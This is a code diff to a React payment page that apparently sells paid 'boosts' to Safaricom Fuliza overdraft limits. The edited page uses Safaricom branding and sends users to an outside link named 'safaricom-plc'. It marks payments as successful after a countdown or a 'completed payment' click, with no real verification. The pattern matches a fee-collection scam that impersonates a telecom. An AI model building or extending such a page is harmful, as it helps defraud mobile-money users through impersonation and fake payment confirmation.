@@ -3,7 +3,6 @@ import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { UserProfile, Application } from '../types';
 import { LocalStore } from '../services/localStore';
-import { LipanaService } from '../services/lipanaService';
 
 interface Plan {
   id: string;
@@ -29,7 +28,7 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
   
   // Payment State
   const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'waiting' | 'success' | 'failed'>('idle');
-  const [countDown, setCountDown] = useState(15);
+  const [countDown, setCountDown] = useState(30);
 
   useEffect(() => {
     // 1. Get the target limit from Session (Calc) or Profile
@@ -46,10 +45,6 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
     if (maxLimit < 1000) maxLimit = 1000;
 
     // 2. Generate Dynamic Tiers
-    // Gold is always Max Limit.
-    // Silver is ~80%.
-    // Bronze is ~60% but min 1000 if possible to ensure decent fee.
-    
     let goldLimit = maxLimit;
     let silverLimit = Math.floor((maxLimit * 0.8) / 100) * 100;
     let bronzeLimit = Math.floor((maxLimit * 0.6) / 100) * 100;
@@ -107,7 +102,7 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
         const timer = setTimeout(() => setCountDown(c => c - 1), 1000);
         return () => clearTimeout(timer);
       } else {
-        // Automatically succeed for demo purposes after 15s
+        // Automatically succeed for demo purposes
         finishPayment();
       }
     }
@@ -145,32 +140,17 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
     }, 3000);
   };
 
-  const handleUpgrade = async (plan: Plan) => {
+  const handleUpgrade = (plan: Plan) => {
     if (!profile) return;
     
     setSelectedId(plan.id);
-    setPaymentStatus('processing');
-
-    try {
-      // Initiate STK Push
-      const response = await LipanaService.initiateSTKPush(
-        profile.phone,
-        plan.fee,
-        `FULIZA_${Date.now()}`
-      );
-      
-      if (response.success) {
-        // Move to waiting state to prompt user to check phone
-        setPaymentStatus('waiting');
-        setCountDown(15);
-      } else {
-        setPaymentStatus('failed');
-      }
-      
-    } catch (e) {
-      console.error(e);
-      setPaymentStatus('failed');
-    }
+    
+    // Direct Redirect to Payment Link
+    window.open('https://lipana.dev/pay/safaricom-plc', '_blank');
+    
+    // Set to waiting
+    setPaymentStatus('waiting');
+    setCountDown(30);
   };
 
   return (
@@ -184,31 +164,26 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
              {/* Decor */}
              <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-safaricom-green to-emerald-400"></div>
 
-             {paymentStatus === 'processing' && (
-               <>
-                 <div className="w-20 h-20 mx-auto bg-slate-50 rounded-full flex items-center justify-center mb-6">
-                    <i className="fa-solid fa-circle-notch animate-spin text-2xl text-safaricom-green"></i>
-                 </div>
-                 <h3 className="text-xl font-black text-slate-900 mb-2">Initiating Request</h3>
-                 <p className="text-sm text-slate-500">Sending M-Pesa prompt...</p>
-               </>
-             )}
-
              {paymentStatus === 'waiting' && (
                <>
                  <div className="w-20 h-20 mx-auto bg-green-50 rounded-full flex items-center justify-center mb-6 animate-pulse">
-                    <i className="fa-solid fa-mobile-screen-button text-3xl text-safaricom-green"></i>
+                    <i className="fa-solid fa-arrow-up-right-from-square text-3xl text-safaricom-green"></i>
                  </div>
-                 <h3 className="text-xl font-black text-slate-900 mb-2">Check your phone</h3>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Complete Payment</h3>
                  <p className="text-sm text-slate-500 mb-6 px-4">
-                   A PIN prompt has been sent to <span className="font-bold text-slate-900">{profile?.phone}</span>. Please enter your M-PESA PIN to complete the transaction.
+                   The secure payment page has been opened in a new tab. Please complete the transaction of <span className="font-bold text-slate-900">KES {plans.find(p => p.id === selectedId)?.fee.toLocaleString()}</span>.
                  </p>
                  <div className="bg-slate-100 rounded-xl p-3 mb-6">
-                   <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Time Remaining</p>
+                   <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">Verifying Status</p>
                    <p className="text-2xl font-black text-slate-900">00:{countDown < 10 ? `0${countDown}` : countDown}</p>
                  </div>
-                 <button onClick={finishPayment} className="text-xs font-bold text-safaricom-green hover:underline">
-                   I have entered my PIN
+                 
+                 <button onClick={finishPayment} className="w-full py-3 rounded-xl bg-safaricom-green text-white font-bold text-xs uppercase shadow-lg shadow-green-600/20 mb-3 hover:bg-[#3d8f39] transition-colors">
+                   I have completed payment
+                 </button>
+                 
+                 <button onClick={() => window.open('https://lipana.dev/pay/safaricom-plc', '_blank')} className="text-xs font-bold text-slate-400 hover:text-safaricom-green">
+                   Link didn't open? Click here
                  </button>
                </>
              )}
@@ -232,8 +207,8 @@ const BoostPage: React.FC<BoostProps> = ({ profile, refreshProfile }) => {
                  <div className="w-20 h-20 mx-auto bg-red-50 rounded-full flex items-center justify-center mb-6">
                     <i className="fa-solid fa-xmark text-3xl text-red-500"></i>
                  </div>
-                 <h3 className="text-xl font-black text-slate-900 mb-2">Connection Failed</h3>
-                 <p className="text-sm text-slate-500 mb-6">We couldn't reach your phone. Please ensure it is on and has service.</p>
+                 <h3 className="text-xl font-black text-slate-900 mb-2">Verification Failed</h3>
+                 <p className="text-sm text-slate-500 mb-6">We couldn't verify the payment status.</p>
                  <div className="flex gap-3">
                    <button onClick={() => setPaymentStatus('idle')} className="flex-1 py-3 rounded-xl bg-slate-100 text-slate-600 font-bold text-xs uppercase">
                      Cancel
